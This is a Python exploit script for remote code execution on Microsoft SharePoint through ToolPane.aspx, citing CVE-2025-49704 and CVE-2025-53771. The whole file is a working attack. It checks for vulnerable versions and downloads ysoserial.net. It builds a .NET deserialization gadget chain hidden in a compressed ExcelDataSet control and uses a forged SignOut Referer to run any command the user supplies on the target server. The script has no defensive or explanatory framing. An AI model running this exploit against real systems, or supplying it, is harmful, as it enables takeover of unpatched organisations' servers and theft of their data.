import requests
import base64
import zlib
import random
import string
import re
import sys
import os
import subprocess
import shutil
import time
from urllib.parse import urlparse
from io import BytesIO

# For disabling warnings for unverified HTTPS
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

YSOSERIAL_PATH = None  # will be set in class after detection/download


class SharePointToolPaneRCE:
    def __init__(self, target):
        self.target = self.normalize_target(target)
        self.session = requests.Session()
        self.session.verify = False
        self.ysoserial_path = self._find_or_download_ysoserial()

    def _log(self, msg):
        print(msg)

    def normalize_target(self, target):
        if not target.startswith("http"):
            # Try https then http
            for scheme in ["https", "http"]:
                url = f"{scheme}://{target.rstrip('/')}"
                try:
                    r = requests.get(f"{url}/_layouts/15/start.aspx", timeout=5, verify=False)
                    if r.status_code == 200:
                        self._log(f"[*] Initialized target: {url} (port {urlparse(url).port or (443 if scheme=='https' else 80)})")
                        return url
                except Exception:
                    continue
            self._log(f"[*] Initialized target: http://{target} (port 80)")
            return f"http://{target.rstrip('/')}"
        else:
            self._log(f"[*] Initialized target: {target.rstrip('/')}")
            return target.rstrip('/')

    def _find_or_download_ysoserial(self):
        # Check common path in user home
        base_dir = os.path.join(os.path.expanduser("~"), "ysoserial.net", "Release")
        ysoserial_exe = os.path.join(base_dir, "ysoserial.exe")
        if os.path.isfile(ysoserial_exe):
            self._log(f"[*] ysoserial.net found at {ysoserial_exe}")
            return ysoserial_exe

        self._log("[*] ysoserial.net executable not found, attempting to download...")

        # Download from official GitHub releases (example URL, update as needed)
        url = "https://github.com/pwntester/ysoserial.net/releases/latest/download/ysoserial.exe"
        os.makedirs(base_dir, exist_ok=True)
        target_path = ysoserial_exe
        try:
            resp = requests.get(url, stream=True)
            if resp.status_code == 200:
                with open(target_path, "wb") as f:
                    shutil.copyfileobj(resp.raw, f)
                self._log(f"[*] ysoserial.net downloaded to {target_path}")
                return target_path
            else:
                self._log("[!] Failed to download ysoserial.net executable")
                sys.exit(1)
        except Exception as e:
            self._log(f"[!] Exception during ysoserial.net download: {e}")
            sys.exit(1)

    def check_version(self):
        url = f"{self.target}/_layouts/15/start.aspx"
        self._log(f"[*] Checking target version at: {url}")
        try:
            r = self.session.get(url, timeout=10)
        except Exception as e:
            self._log(f"[!] Connection failed: {e}")
            return False

        if r.status_code != 200:
            self._log(f"[!] Unexpected response code {r.status_code}")
            return False

        match = re.search(r'siteClientTag"\s*:\s*"\d*[$]+([^"]+)"', r.text)
        if not match:
            self._log("[!] Unable to extract the siteClientTag")
            return False
        version = match.group(1)
        self._log(f"[*] Detected SharePoint version: {version}")

        vulnerable_versions = [
            ("16.0.14326.20450", "16.0.18526.20424"),
            ("16.0.10337.12109", "16.0.10417.20027"),
            ("16.0.4351.1000", "16.0.5508.1000"),
            ("15.0.4481.1005", "15.0.5545.1000"),
            ("14.0.7015.1000", "14.0.7268.5000"),
        ]

        def version_to_tuple(v):
            return tuple(int(x) for x in v.split("."))

        v_target = version_to_tuple(version)
        for vmin, vmax in vulnerable_versions:
            if version_to_tuple(vmin) <= v_target <= version_to_tuple(vmax):
                self._log(f"[+] Check: Detected vulnerable Microsoft SharePoint Server version {version}")
                return True

        self._log(f"[-] Target patched or unsupported SharePoint version: {version}")
        return False

    def _random_alpha(self, length=None):
        length = length or random.randint(8, 16)
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def _generate_gadget_payload(self, command):
        """
        Use ysoserial.net executable to generate a TypeConfuseDelegate + LosFormatter payload
        with the specified command.

        Returns the raw bytes of the serialized gadget.
        """
        if not os.path.isfile(self.ysoserial_path):
            raise RuntimeError("ysoserial.net executable not found")

        # Wrap command inside cmd.exe /c "..." to handle shell operators
        wrapped_command = f'cmd.exe /c "{command.replace("\"", "\\\"")}"'

        ysoserial_cmd = [
            self.ysoserial_path,
            "-g", "TypeConfuseDelegate",
            "-f", "LosFormatter",
            "-o", "raw",
            "-c", wrapped_command
        ]

        self._log(f"[*] Generating gadget payload with ysoserial.net: {' '.join(ysoserial_cmd)}")

        try:
            result = subprocess.run(ysoserial_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
            self._log(f"[*] ysoserial.net payload generated, {len(result.stdout)} bytes")
            return result.stdout
        except subprocess.CalledProcessError as e:
            self._log(f"[!] ysoserial.net generation failed: {e.stderr.decode()}")
            raise RuntimeError("ysoserial.net payload generation failed")

    def _create_dataset_wrapper(self, nested_gadget_b64):
        """
        Create the XML DataSet wrapper gadget chain as per CVE-2025-49704 bypass.
        The nested_gadget_b64 is the base64 encoded ysoserial gadget payload.
        """
        name_a = self._random_alpha()
        name_b = self._random_alpha()
        name_c = self._random_alpha()

        schema = f'''<xs:schema xmlns="" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="{name_a}">
  <xs:element name="{name_a}" msdata:IsDataSet="true" msdata:UseCurrentLocale="true">
      <xs:complexType>
          <xs:choice minOccurs="0" maxOccurs="unbounded">
              <xs:element name="{name_b}">
                  <xs:complexType>
                      <xs:sequence>
                          <xs:element name="{name_c}" msdata:DataType="System.Collections.Generic.List`1[[System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]" type="xs:anyType" minOccurs="0"/>
                      </xs:sequence>
                  </xs:complexType>
              </xs:element>
          </xs:choice>
      </xs:complexType>
  </xs:element>
</xs:schema>'''

        diffgram = f'''<diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">
    <{name_a}>
        <{name_b} diffgr:id="Table" msdata:rowOrder="0" diffgr:hasChanges="inserted">
            <{name_c} xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
                <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
                    <ExpandedElement/>
                    <ProjectedProperty0>
                        <MethodName>Deserialize</MethodName>
                        <MethodParameters>
                            <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">{nested_gadget_b64}</anyType>
                        </MethodParameters>
                        <ObjectInstance xsi:type="LosFormatter"></ObjectInstance>
                    </ProjectedProperty0>
                </ExpandedWrapperOfLosFormatterObjectDataProvider>
            </{name_c}>
        </{name_b}>
    </{name_a}>
</diffgr:diffgram>'''

        # Combine schema and diffgram bytes
        return schema.encode() + diffgram.encode()

    def _create_full_payload(self, command):
        # Generate the inner gadget payload raw bytes
        gadget_raw = self._generate_gadget_payload(command)
        # Base64 encode inner gadget
        nested_b64 = base64.b64encode(gadget_raw).decode()

        # Wrap the inner gadget inside dataset wrapper (XmlSchema + BinaryFormatter gadget chain)
        dataset_payload = self._create_dataset_wrapper(nested_b64)

        return dataset_payload

    def exploit(self, command):
        payload_raw = self._create_full_payload(command)

        # Compress payload using gzip with header
        compressor = zlib.compressobj(wbits=16+zlib.MAX_WBITS)
        compressed_payload = compressor.compress(payload_raw) + compressor.flush()

        # Random namespaces and path segment for CVE-2025-53771 bypass
        namespace_ui = self._random_alpha()
        namespace_scorecards = self._random_alpha()
        rand_path = self._random_alpha(random.randint(12, 16))

        xml = f'''<%@ Register Tagprefix="{namespace_ui}" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
<%@ Register Tagprefix="{namespace_scorecards}" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<{namespace_ui}:UpdateProgress>
  <ProgressTemplate>
    <{namespace_scorecards}:ExcelDataSet CompressedDataTable="{base64.b64encode(compressed_payload).decode()}" DataTable-CaseSensitive="true" runat="server"/>
  </ProgressTemplate>
</{namespace_ui}:UpdateProgress>'''

        url = f"{self.target}/_layouts/15/ToolPane.aspx/{rand_path}"

        headers = {
            "Referer": f"{self.target}/_layouts/SignOut.aspx"
        }

        params = {
            "DisplayMode": "Edit",
            self._random_alpha(): "/ToolPane.aspx"
        }

        data = {
            "MSOTlPn_Uri": f"{self.target}/_controltemplates/15/AclEditor.ascx",
            "MSOTlPn_DWP": xml
        }

        self._log(f"[*] Sending exploit to {url}")
        resp = self.session.post(url, headers=headers, params=params, data=data)
        self._log(f"[*] Exploit sent. Response code: {resp.status_code}")
        if resp.status_code == 200:
            self._log("[+] Exploit sent successfully.")
        else:
            self._log("[-] Exploit may have failed.")
        return resp


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 exploit.py <target_ip_or_domain> <command_to_execute>")
        sys.exit(1)

    target = sys.argv[1]
    command = sys.argv[2]

    exploit = SharePointToolPaneRCE(target)

    if exploit.check_version():
        print("[+] Target vulnerable, launching exploit...")
        exploit.exploit(command)
    else:
        print("[-] Target is not vulnerable or unreachable.")
